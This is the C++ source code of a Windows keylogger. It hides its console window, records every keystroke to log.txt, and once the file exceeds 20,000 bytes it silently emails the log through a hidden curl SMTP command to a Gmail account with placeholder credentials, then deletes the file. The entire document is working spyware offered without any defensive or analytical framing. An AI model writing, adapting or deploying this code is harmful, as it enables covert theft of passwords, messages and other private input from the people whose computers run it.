#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>



using namespace std;


void send_email(void){
    char* command = "curl smtp://smtp.gmail.com:587 --mail-from \"fuckyou@gmail.com\" --mail-rcpt \"fuckyou@gmail.com\" --ssl -u fuckyou@gmail.com:thispasswordisfake -T \"log.txt\" -k --anyauth";
    WinExec(command, SW_HIDE);
}

void check_contents(){
    fstream LogFile;
    LogFile.open("log.txt");

    char ch;
    int i,c=0,sp=0;
    LogFile.seekg(0,LogFile.end);
    c = LogFile.tellg();
    LogFile.close();
    if (c>20000){
        send_email();
        Sleep(6000);
        if ( remove("log.txt") == 0 ){
            cout<<"removed file sucessfully"<<endl;
        }
    }
}



void LOG(string input) {
	fstream LogFile;
	LogFile.open("log.txt", fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}


bool SpecialKeys(int S_Key) {
	switch (S_Key) {
	case VK_SPACE:
		LOG(" ");
		return true;
	case VK_RETURN:
		LOG("\n");
		return true;
	case '¾':
		LOG(".");
		return true;
	case VK_SHIFT:
		LOG("#SHIFT#");
		return true;
	case VK_BACK:
		LOG("\b");
		return true;
	case VK_RBUTTON:
		LOG("#R_CLICK#");
		return true;
	case VK_CAPITAL:
		LOG("#CAPS_LCOK");
		return true;
	case VK_TAB:
		LOG("#TAB");
		return true;
	case VK_UP:
		LOG("#UP_ARROW_KEY");
		return true;
	case VK_DOWN:
		LOG("#DOWN_ARROW_KEY");
		return true;
	case VK_LEFT:
		LOG("#LEFT_ARROW_KEY");
		return true;
	case VK_RIGHT:
		LOG("#RIGHT_ARROW_KEY");
		return true;
	case VK_CONTROL:
		LOG("#CONTROL");
		return true;
	case VK_MENU:
		LOG("#ALT");
		return true;
	default: 
		return false;
	}
}



int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	char KEY = 'x';

	while (true) {
		Sleep(10);
		for (int KEY = 8; KEY <= 255; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {
				if (SpecialKeys(KEY) == false) {

					fstream LogFile;
					LogFile.open("log.txt", fstream::app);
					if (LogFile.is_open()) {
						LogFile << char(KEY);
						LogFile.close();
					}

				}
			}
		
        }
	check_contents();
    }

	return 0;
}
